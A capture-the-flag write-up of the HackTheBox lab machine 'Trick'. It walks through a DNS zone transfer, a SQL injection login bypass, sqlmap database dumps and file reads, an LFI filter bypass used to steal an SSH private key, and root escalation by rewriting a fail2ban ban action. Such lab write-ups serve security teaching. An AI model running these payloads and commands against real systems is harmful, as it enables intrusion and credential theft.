# Trick

## Summary

Nmap finds SSH, SMTP, DNS, and HTTP (Nginx). We use `dig` to perform a reverse DNS lookup on the ip address of the box, which tells us that the box's domain name is `trick.htb`. Then, we use `dig` again to get the zone transfers for `trick.htb`, which shows us the `preprod-payroll` virtual host. This vhost has a login form, which we find is vulnerable to a basic SQL injection. Then, we use [sqlmap](https://github.com/sqlmapproject/sqlmap) to exploit this vulnerability and dump the database. The credentials we find in the database are not useful, but we can use `sqlmap` to read files on the box.

We read the nginx configuration file and discover the `preprod-marketing` vhost. We fuzz this new vhost a little, but we do not find anything. So, using the SQLi from `preprod-payroll`, we get the source code for `preprod-marketing` and discover a LFI exploit. Since `preprod-marketing` is running as the `michael` user, we are able to get their SSH private key. This gives us the `user.txt` flag.

Now that we are on the machine, we run [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and discover that we can run `/etc/init.d/fail2ban restart` as root and that we can write to the directory `/etc/fail2ban/action.d`. [This article](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7) explains the exploit. Basically, we can overwrite the default ban action since we can write to the fail2ban `action.d` folder. We restart fail2ban so our new configuration change becomes active. Then, we spam SSH with invalid logins to trigger a band, thus running our custom command, which will write the `root.txt` flag to a file we can read.

## Enumeration

### Nmap

First, let's scan for open ports using `nmap`. We can quickly scan for open ports and store them in a variable: `ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)`. Then, we can scan those specific ports in depth by running `nmap`'s built-in scripts: `nmap -p$ports -sC -sV 10.10.11.166`.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have SSH, SMTP, DNS, and HTTP (Nginx).

### Website (Port `80`)

![](screenshots/Screenshot%202022-08-05%20at%2017-27-52%20Coming%20Soon%20-%20Start%20Bootstrap%20Theme.png)

We try bruteforcing directories by running `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.10.11.166/FUZZ`, which finds nothing.

### DNS

We can perform a reverse DNS lookup of the IP address of the box by running `dig -x 10.10.11.166 @10.10.11.166`:

```
; <<>> DiG 9.18.4-2-Debian <<>> -x 10.10.11.166 @10.10.11.166
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21082
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 3ac7f0627261ff6a064d4d6562ed8eb780f90544ccebc2ae (good)
;; QUESTION SECTION:
;166.11.10.10.in-addr.arpa.     IN      PTR

;; ANSWER SECTION:
166.11.10.10.in-addr.arpa. 604800 IN    PTR     trick.htb.

;; AUTHORITY SECTION:
11.10.10.in-addr.arpa.  604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 44 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP)
;; WHEN: Fri Aug 05 17:42:14 EDT 2022
;; MSG SIZE  rcvd: 163
```

This tells us that the box's domain name is `trick.htb`. Let's add that domain to `/etc/hosts`: `echo "10.10.11.166 trick.htb" | sudo tee -a /etc/hosts`.

The second item on the [HackTricks page for DNS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer) is about "Zone Transfers." You can learn more from [this article](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/). We run `dig axfr trick.htb @trick.htb` to get the zone transfers for `trick.htb`:

```
; <<>> DiG 9.18.4-2-Debian <<>> axfr trick.htb @trick.htb
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 24 msec
;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
;; WHEN: Fri Aug 05 17:44:53 EDT 2022
;; XFR size: 6 records (messages 1, bytes 231)
```

This gives us a new subdomain: `preprod-payroll.trick.htb`. Let's add it to `/etc/hosts`: `echo "10.10.11.166 preprod-payroll.trick.htb" | sudo tee -a /etc/hosts`.

### Virtual Host Scanning

Let's scan for other virtual hosts to be safe. We can do this by running `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://trick.htb/ -H "Host: FUZZ.trick.htb" -fs 5480`. This finds nothing, but since we know one of the subdomains starts with `preprod-`, we can try bruteforcing only the part after `preprod-` by running `sudo ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://trick.htb/ -H "Host: preprod-FUZZ.trick.htb" -fs 5480`:

```
marketing               [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 32ms]
payroll                 [Status: 302, Size: 9546, Words: 1453, Lines: 267, Duration: 26ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1356 req/sec :: Duration: [0:01:30] :: Errors: 0 ::
```

Let's add the new `preprod-marketing` subdomain to `/etc/hosts`: `echo "10.10.11.166 preprod-marketing.trick.htb" | sudo tee -a /etc/hosts`.

### `preprod-payroll` Virtual Host

We have a login form:

![](screenshots/Screenshot%202022-08-05%20at%2017-49-01%20Admin%20Employee's%20Payroll%20Management%20System.png)

After trying the standard basic SQL injections, we find that using `' or 1=1 -- ` as the username and anything as the password works!

![](screenshots/Screenshot%202022-08-05%20at%2017-51-19%20Admin%20Employee's%20Payroll%20Management%20System.png)

The login form makes a post request to `http://preprod-payroll.trick.htb/ajax.php?action=login`. If we simply make a GET request by visiting that page, we get:

```
Notice: Undefined variable: username in /var/www/payroll/admin_class.php on line 20

Notice: Undefined variable: password in /var/www/payroll/admin_class.php on line 20
3
```

So, we now know the path of a file, which is helpful if we get a LFI exploit or something similar.

Since we know we have a SQL injection, we can use [sqlmap](https://github.com/sqlmapproject/sqlmap) to automate dumping the database. You can learn about sqlmap's command in [its usage documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

```
$ sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:01:17 /2022-08-05/

[18:01:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.14 (KHTML, like Gecko) Chrome/24.0.1292.0 Safari/537.14' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[18:01:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=os8fgd0vrab...lpgtvefjog'). Do you want to use those [Y/n] Y
[18:01:17] [INFO] testing if the target URL content is stable
[18:01:18] [INFO] target URL content is stable
[18:01:18] [INFO] testing if POST parameter 'username' is dynamic
[18:01:18] [WARNING] POST parameter 'username' does not appear to be dynamic
[18:01:18] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[18:01:18] [INFO] testing for SQL injection on POST parameter 'username'
[18:01:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:01:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:01:21] [INFO] POST parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable (with --not-string="21")
[18:01:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (2) values? [Y/n] Y
[18:01:21] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:01:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:01:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:01:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:01:22] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:01:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:01:22] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:01:22] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:01:22] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:01:22] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:01:22] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[18:01:22] [INFO] testing 'Generic inline queries'
[18:01:22] [INFO] testing 'MySQL inline queries'
[18:01:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:01:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:01:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:01:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:01:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:01:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:01:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:01:32] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[18:01:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:01:32] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:01:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:01:33] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:01:36] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[18:01:36] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[18:01:39] [INFO] testing 'Generic UNION query (98) - 21 to 40 columns'
[18:01:40] [INFO] testing 'Generic UNION query (98) - 41 to 60 columns'
[18:01:40] [INFO] testing 'MySQL UNION query (98) - 1 to 20 columns'
[18:01:43] [INFO] testing 'MySQL UNION query (98) - 21 to 40 columns'
[18:01:43] [INFO] testing 'MySQL UNION query (98) - 41 to 60 columns'
[18:01:44] [INFO] testing 'MySQL UNION query (98) - 61 to 80 columns'
[18:01:45] [INFO] testing 'MySQL UNION query (98) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 416 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=a,password=a' AND 9182=(SELECT (CASE WHEN (9182=9182) THEN 9182 ELSE (SELECT 2526 UNION SELECT 2437) END))-- TwHM

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=a,password=a' OR (SELECT 9149 FROM(SELECT COUNT(*),CONCAT(0x7162707a71,(SELECT (ELT(9149=9149,1))),0x716a707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- aDCf

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=a,password=a' AND (SELECT 6496 FROM (SELECT(SLEEP(5)))nbBO)-- qqYe
---
[18:01:46] [INFO] the back-end DBMS is MySQL
web application technology: Nginx 1.14.2, PHP
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[18:01:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb'
```

This identifies a few exploits, which we can now use to explore the database. If we append `--dbs` to the above command we will get the list of databases:

```
[*] information_schema
[*] payroll_db
```

Then, we can dump the tables from `payroll_db` by running `sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --batch -D payroll_db --tables`:

```
Database: payroll_db
[11 tables]
+---------------------+
| position            |
| allowances          |
| attendance          |
| deductions          |
| department          |
| employee            |
| employee_allowances |
| employee_deductions |
| payroll             |
| payroll_items       |
| users               |
+---------------------+
```

Finally, we can dump the `users` table by running `sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --batch -D payroll_db -T users --dump`:

```
Database: payroll_db
Table: users
[1 entry]
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| id | doctor_id | name          | type | address | contact | password              | username   |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
| 1  | 0         | Administrator | 1    | <blank> | <blank> | SuperGucciRainbowCake | Enemigosss |
+----+-----------+---------------+------+---------+---------+-----------------------+------------+
```

This gives us a set of credentials: `Enemigosss:SuperGucciRainbowCake`. Trying to use them to SSH onto the machine doesn't work.

We can try reading files with `sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --file-read /etc/passwd`, which works:

```
$ cat /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

So, the `michael` user is probably our way onto the box. Attempting to read `/home/michael/.ssh/id_rsa` fails though, so this site is probably not running as the `michael` user.

Since we can read files, we also could have learned about the other subdomain by reading `/etc/nginx/sites-available/default`:

```
server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Let's try to read the source code of the `preprod-payroll` virtual host. From the error message we got before, we know `/var/www/payroll/admin_class.php` is a file, so we'll get that to start. We get a somewhat large file, but it has the line `include 'db_connect.php';` at the top. So, we get `/var/www/payroll/db_connect.php`:

```php
<?php

$conn= new mysqli('localhost','remo','TrulyImpossiblePasswordLmao123','payroll_db')or die("Could not connect to mysql".mysqli_error($con));
```

We get the credentials for the mysql server: `remo:TrulyImpossiblePasswordLmao123`.

Neither `SuperGucciRainbowCake` nor `TrulyImpossiblePasswordLmao123` works as the ssh password for the `michael` user does not work.

### `preprod-marketing` Virtual Host

![](screenshots/Screenshot%202022-08-05%20at%2019-07-36%20Business%20Oriented%20CSS%20Template.png)

We scan for other pages using `ffuf -ic -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://preprod-marketing.trick.htb/index.php\?page\=FUZZ.html -fs 0`:

```
contact                 [Status: 200, Size: 7677, Words: 2554, Lines: 145, Duration: 36ms]
about                   [Status: 200, Size: 13272, Words: 4709, Lines: 243, Duration: 37ms]
home                    [Status: 200, Size: 9660, Words: 3007, Lines: 179, Duration: 39ms]
services                [Status: 200, Size: 10757, Words: 3505, Lines: 193, Duration: 145ms]
```

This doesn't find anything that isn't already linked to by the main page.

## Foothold

Let's try to get the source code of the site by looking in the `/var/www/market` directory. Running `sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" --data "username=a,password=a" --random-agent --level 3 --risk 2 --file-read /var/www/market/index.php` gets use the `index.php` file for the `preprod-marketing` vhost:

```php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>
```

We have a call to `include` that we can control via the `page` GET parameter. All `../` are removed, but this is only done once, so we can bypass it by using `....//` instead of `../` since removing `../` from `....//` results in `../`. Sure enough, visiting `http://preprod-marketing.trick.htb/index.php?page=....//....//....//etc/passwd` gives us the contents of `/etc/passwd`. We can check which user we are running as by getting `http://preprod-marketing.trick.htb/index.php?page=....//....//....//proc/self/status`:

```
Name:   php-fpm7.3
Umask:  0022
State:  R (running)
Tgid:   24155
Ngid:   0
Pid:    24155
PPid:   724
TracerPid:      0
Uid:    1001    1001    1001    1001
Gid:    1001    1001    1001    1001
FDSize: 64
Groups: 1001 1002
NStgid: 24155
NSpid:  24155
NSpgid: 724
NSsid:  724
...
```

ID `1001` is `michael` (from `/etc/passwd`), so we should be able to get his SSH private key by running `curl http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//home/michael/.ssh/id_rsa > id_rsa`.

Now, we can SSH to the box as `michael` by running `ssh michael@trick.htb -i id_rsa` and then get the `user.txt` flag with `cat ~/user.txt`.

## Privilege Escalation

We upload [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) by running `upload linpeas.sh` in the local [pwncat](https://github.com/calebstewart/pwncat) shell. Run LinPEAS with `./linpeas.sh -a 2>&1 | tee linpeas_report.txt`. Download the report with `download linepeas_report.txt` in the local terminal. You can open [linpeas_report.txt](./linpeas_report.txt) with `less -R linpeas_report.txt`.

We see this in the output:

```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

So, we can run the command `/etc/init.d/fail2ban restart` as root.

Searching for "fail2ban" in the LinPEAS output also shows this:

```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group security:
/etc/fail2ban/action.d
```

```
(remote) michael@trick:/tmp$ ls -la /etc/fail2ban/action.d
total 288
drwxrwx--- 2 root    security  4096 Aug  6 01:50 .
```

So, we can write to `/etc/fail2ban/action.d`. Searching for "fail2ban privilege escalation" finds [Abusing Fail2ban misconfiguration to escalate privileges on Linux](https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7), which explains the exploit we are about to perform. However, the exploit is not that complicated and can be figured out without the guide.

We can view the enabled fail2ban jails with `cat /etc/fail2ban/jail.conf | grep "enabled = true" -B 1`, which will show us nothing. But jails can also be configured in `/etc/fail2ban/jail.d/`. Checking that directory we find a file called `defaults-debian.conf` that enabled the `sshd` jail.

In the `/etc/fail2ban/jail.conf` file we see the default ban action:

```conf
# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
```

`iptables-multiport` is a file in `/etc/fail2ban/action.d/`, which means we can edit it:

```
ls -la /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 root root 1420 Aug  6 02:03 /etc/fail2ban/action.d/iptables-multiport.conf
```

We do not have permissions over this file, but since we have write permissions on the directory we can copy the file to `/tmp` with `cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp`, edit it, and then copy it back with `rm /etc/fail2ban/action.d/iptables-multiport.conf && cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/`.

For the `iptables-multiport.conf` file, we change the line that reads `actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>` to `actionban = cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt && sleep 30 && rm /tmp/root.txt`.

Then, restart fail2ban with `sudo /etc/init.d/fail2ban restart` so our configuration change takes effect. Then, ssh and use an incorrect password multiple times. This should create a file `/tmp/root.txt` with the root flag! Note: We easily could replace the ban command with a reverse shell to get a root shell. The copy, fail2ban restart, failed ssh attempts, and getting the root flag all need to be done very quickly because the fail2ban configuation is reset quite often so you need to hit the number of failed SSH attempts before that happens. Tip: Run `watch ls -la /tmp` to see when the `/tmp/root.txt` file is created. Another Tip: Instead of manually getting fail2ban to ban you, use `hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb` to spam a lot of login attempts.
